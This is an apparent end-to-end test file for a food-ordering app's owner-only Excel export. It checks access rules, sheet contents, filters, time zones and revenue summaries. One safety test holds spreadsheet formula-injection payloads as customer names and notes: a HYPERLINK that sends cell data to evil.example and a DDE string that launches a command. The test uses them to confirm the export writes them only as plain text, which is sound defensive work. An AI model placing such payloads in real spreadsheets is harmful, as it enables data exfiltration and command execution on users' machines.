import { randomBytes } from 'node:crypto';
import { strFromU8, unzipSync } from 'fflate';
import readExcelFile from 'read-excel-file/node';
import { FulfillmentStatus, PaymentStatus } from '@prisma/client';
import request from 'supertest';
import { boot } from './cms-helpers';

const CUSTOMER = 'e2e-export@orders.example';
type Sheets = { sheet: string; data: unknown[][] }[];

describe('Excel export (e2e, requires seeded db)', () => {
  let ctx: Awaited<ReturnType<typeof boot>>;
  let itemId: string;

  const binary = (res: request.Response, cb: (e: Error | null, b: Buffer) => void) => {
    const chunks: Buffer[] = [];
    res.on('data', (c: Buffer) => chunks.push(c));
    res.on('end', () => cb(null, Buffer.concat(chunks)));
  };
  const download = (qs = '', who: 'owner' | 'staff' = 'owner') => ctx[who].get(`/admin/orders/export${qs}`).buffer(true).parse(binary);
  const open = async (qs = ''): Promise<{ sheets: Sheets; file: Buffer }> => {
    const res = await download(qs).expect(200);
    const file = res.body as Buffer;
    return { sheets: (await readExcelFile(file)) as unknown as Sheets, file };
  };
  const sheet = (s: Sheets, name: string) => s.find((x) => x.sheet === name)!.data;

  async function make(over: { name?: string; notes?: string; status?: FulfillmentStatus; payment?: PaymentStatus; createdAt?: Date; qty?: number; reference?: string; cancelReason?: string } = {}) {
    const qty = over.qty ?? 2;
    const item = await ctx.prisma.menuItem.findUniqueOrThrow({ where: { id: itemId } });
    const subtotal = item.priceCents * qty;
    const tax = Math.floor((subtotal * 825 + 5000) / 10000);
    return ctx.prisma.order.create({
      data: {
        publicToken: randomBytes(24).toString('base64url'),
        customerName: over.name ?? 'Export Customer', customerEmail: CUSTOMER, customerPhone: '+15550102030', fulfillmentType: 'PICKUP', notes: over.notes,
        subtotalCents: subtotal, taxCents: tax, totalCents: subtotal + tax,
        fulfillmentStatus: over.status ?? 'COMPLETED', paymentStatus: over.payment ?? 'PAID',
        paymentVerifiedAt: (over.payment ?? 'PAID') === 'PAID' ? new Date() : null, paymentReference: over.reference, cancelReason: over.cancelReason,
        ...(over.createdAt && { createdAt: over.createdAt }),
        items: { create: [{ menuItemId: item.id, nameSnapshot: item.name, unitPriceCents: item.priceCents, quantity: qty, lineTotalCents: subtotal }] },
      },
    });
  }

  beforeAll(async () => {
    ctx = await boot('e2e-exp');
    itemId = (await ctx.prisma.menuItem.findUniqueOrThrow({ where: { slug: 'vada-pav' } })).id;
    await ctx.prisma.order.deleteMany({ where: { customerEmail: CUSTOMER } });
  });
  afterAll(async () => {
    await ctx.prisma.order.deleteMany({ where: { customerEmail: CUSTOMER } });
    await ctx.close();
  });

  describe('access', () => {
    it('is owner-only: anonymous gets 401, staff get 403 (it holds customer contact details)', async () => {
      await ctx.api().get('/api/v1/admin/orders/export').expect(401);
      await download('', 'staff').expect(403);
    });
    it('sends a real .xlsx download that is never cached', async () => {
      const res = await download().expect(200);
      expect(res.headers['content-type']).toContain('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
      expect(res.headers['content-disposition']).toMatch(/^attachment; filename="shree-foods-orders-\d{4}-\d{2}-\d{2}\.xlsx"$/);
      expect(res.headers['cache-control']).toBe('no-store');
      expect((res.body as Buffer).subarray(0, 2).toString()).toBe('PK'); // an .xlsx is a zip file
    });
  });

  describe('contents', () => {
    it('has Orders, Items and Summary sheets with clear headings', async () => {
      const { sheets } = await open();
      expect(sheets.map((s) => s.sheet)).toEqual(['Orders', 'Items', 'Summary']);
      expect(sheet(sheets, 'Orders')[0]).toEqual(['Order', 'Placed', 'Customer', 'Email', 'Phone', 'Order type', 'Items', 'Notes', 'Subtotal', 'Tax', 'Total', 'Payment', 'Payment reference', 'Payment verified', 'Order status', 'Cancellation reason']);
      expect(sheet(sheets, 'Items')[0]).toEqual(['Order', 'Placed', 'Customer', 'Item', 'Quantity', 'Unit price', 'Line total', 'Order status', 'Payment']);
    });

    it('writes each order accurately, with money as real numbers', async () => {
      const o = await make({ name: 'Asha Patel', notes: 'extra chutney', reference: 'PP-123', qty: 3 });
      const { sheets } = await open(`?q=${encodeURIComponent('Asha Patel')}`);
      const row = sheet(sheets, 'Orders').find((r) => r[0] === `SF-${String(o.orderNumber).padStart(4, '0')}`)!;
      expect(row).toBeDefined();
      expect(row[2]).toBe('Asha Patel');
      expect(row[3]).toBe(CUSTOMER);
      expect(row[4]).toBe('+15550102030');
      expect(row[5]).toBe('Pickup');
      expect(row[6]).toBe('3 × Vada Pav');
      expect(row[7]).toBe('extra chutney');
      expect([row[8], row[9], row[10]]).toEqual([o.subtotalCents / 100, o.taxCents / 100, o.totalCents / 100]); // numbers, not text
      expect(typeof row[10]).toBe('number');
      expect(row[11]).toBe('Paid');
      expect(row[12]).toBe('PP-123');
      expect(row[14]).toBe('Completed');
      const items = sheet(sheets, 'Items').filter((r) => r[0] === row[0]);
      expect(items).toHaveLength(1);
      expect(items[0].slice(3, 7)).toEqual(['Vada Pav', 3, 7, 21]);
    });

    it('produces a valid file even when nothing matches', async () => {
      const { sheets } = await open('?q=zzz-nobody-has-this-name');
      expect(sheet(sheets, 'Orders')).toHaveLength(1); // headings only
      expect(sheet(sheets, 'Summary').some((r) => r[0] === 'Orders in this file' && r[1] === 0)).toBe(true);
    });
  });

  describe('filters match the dashboard list exactly', () => {
    it('same orders, whatever the filters', async () => {
      await make({ status: 'CANCELLED', payment: 'REFUNDED', cancelReason: 'Out of stock', name: 'Filter A' });
      await make({ status: 'PENDING_ACCEPTANCE', payment: 'UNPAID', name: 'Filter B' });
      await make({ status: 'COMPLETED', payment: 'PAID', name: 'Filter C' });
      for (const qs of ['', '?status=COMPLETED', '?payment=REFUNDED', '?status=CANCELLED&payment=REFUNDED', '?q=Filter', '?q=filter%20a', `?q=${encodeURIComponent(CUSTOMER)}`]) {
        const list = (await ctx.owner.get(`/admin/orders${qs}`).expect(200)).body as { total: number };
        const { sheets } = await open(qs);
        expect({ qs, rows: sheet(sheets, 'Orders').length - 1 }).toEqual({ qs, rows: list.total });
      }
      const cancelled = sheet((await open('?status=CANCELLED&q=Filter')).sheets, 'Orders')[1];
      expect(cancelled[14]).toBe('Cancelled');
      expect(cancelled[11]).toBe('Refunded');
      expect(cancelled[15]).toBe('Out of stock');
    });

    it('respects the date range', async () => {
      const old = await make({ name: 'Old Order', createdAt: new Date('2025-03-10T15:00:00Z') });
      const ref = `SF-${String(old.orderNumber).padStart(4, '0')}`;
      const inRange = await open(`?from=${encodeURIComponent('2025-03-01T00:00:00Z')}&to=${encodeURIComponent('2025-04-01T00:00:00Z')}&q=Old%20Order`);
      expect(sheet(inRange.sheets, 'Orders').map((r) => r[0])).toContain(ref);
      const outside = await open(`?from=${encodeURIComponent('2025-05-01T00:00:00Z')}&to=${encodeURIComponent('2025-06-01T00:00:00Z')}&q=Old%20Order`);
      expect(sheet(outside.sheets, 'Orders').map((r) => r[0])).not.toContain(ref);
      await download('?from=2025-06-01T00:00:00Z&to=2025-05-01T00:00:00Z').expect(400); // end before start
    });
  });

  describe('times use the viewer\'s time zone', () => {
    it('writes the wall-clock time they would see on screen', async () => {
      const o = await make({ name: 'Zone Test', createdAt: new Date('2026-01-15T03:30:00Z') });
      const ref = `SF-${String(o.orderNumber).padStart(4, '0')}`;
      const placed = async (tz: string) => {
        const row = sheet((await open(`?q=Zone%20Test&tz=${encodeURIComponent(tz)}`)).sheets, 'Orders').find((r) => r[0] === ref)!;
        // Excel keeps times as fractions of a day (accurate to under a microsecond); like Excel, round to the nearest minute
        return new Date(Math.round((row[1] as Date).getTime() / 60_000) * 60_000).toISOString().slice(0, 16);
      };
      expect(await placed('America/New_York')).toBe('2026-01-14T22:30'); // the evening before, in New York
      expect(await placed('Asia/Kolkata')).toBe('2026-01-15T09:00');
      expect(await placed('UTC')).toBe('2026-01-15T03:30');
      await download('?tz=Not/AZone').expect(400);
    });
  });

  describe('summary figures', () => {
    it('counts revenue only from verified payments, like the dashboard', async () => {
      await make({ name: 'Rev Paid 1', payment: 'PAID', qty: 1 });
      await make({ name: 'Rev Paid 2', payment: 'PAID', qty: 2 });
      await make({ name: 'Rev Waiting', payment: 'AWAITING_VERIFICATION', status: 'PENDING_ACCEPTANCE', qty: 5 });
      await make({ name: 'Rev Refunded', payment: 'REFUNDED', status: 'CANCELLED', qty: 4 });
      const { sheets } = await open('?q=Rev%20');
      const orders = sheet(sheets, 'Orders').slice(1);
      expect(orders).toHaveLength(4);
      const expected = orders.filter((r) => r[11] === 'Paid').reduce((s, r) => s + (r[10] as number), 0);
      const summary = Object.fromEntries(sheet(sheets, 'Summary').filter((r) => r[0]).map((r) => [r[0] as string, r[1]]));
      expect(summary['Orders in this file']).toBe(4);
      expect(summary['Paid orders (verified)']).toBe(2);
      expect(summary['Refunded orders']).toBe(1);
      expect(summary['Cancelled orders']).toBe(1);
      expect(summary['Revenue (verified payments)']).toBeCloseTo(expected, 2);
      expect(expected).toBeGreaterThan(0);
    });
  });

  describe('safety', () => {
    it('writes customer-typed text as plain text, so spreadsheet formulas can never run', async () => {
      const attacks = ['=HYPERLINK("http://evil.example/?x="&A1,"Click")', '+cmd|\' /C calc\'!A0', '-2+3', '@SUM(1+1)', '=1+1'];
      for (const [i, a] of attacks.entries()) await make({ name: a, notes: attacks[(i + 1) % attacks.length] });
      const { sheets, file } = await open(`?q=${encodeURIComponent(CUSTOMER)}`);

      const names = sheet(sheets, 'Orders').slice(1).map((r) => r[2]);
      for (const a of attacks) expect(names).toContain(a); // stored and shown literally, not evaluated
      const notes = sheet(sheets, 'Orders').slice(1).map((r) => r[7]);
      for (const a of attacks) expect(notes).toContain(a);

      // and the file itself contains no formula cells anywhere
      const parts = unzipSync(new Uint8Array(file));
      const sheetXml = Object.entries(parts).filter(([n]) => /^xl\/worksheets\/.*\.xml$/.test(n)).map(([, b]) => strFromU8(b));
      expect(sheetXml.length).toBe(3);
      for (const xml of sheetXml) expect(xml).not.toMatch(/<f[ >]/);
    });

    it('rejects malformed filters instead of guessing', async () => {
      await download('?status=NOPE').expect(400);
      await download('?payment=NOPE').expect(400);
      await download('?from=yesterday').expect(400);
      await download('?q=%00').expect(200); // NUL bytes are stripped, not a 500
    });
  });
});
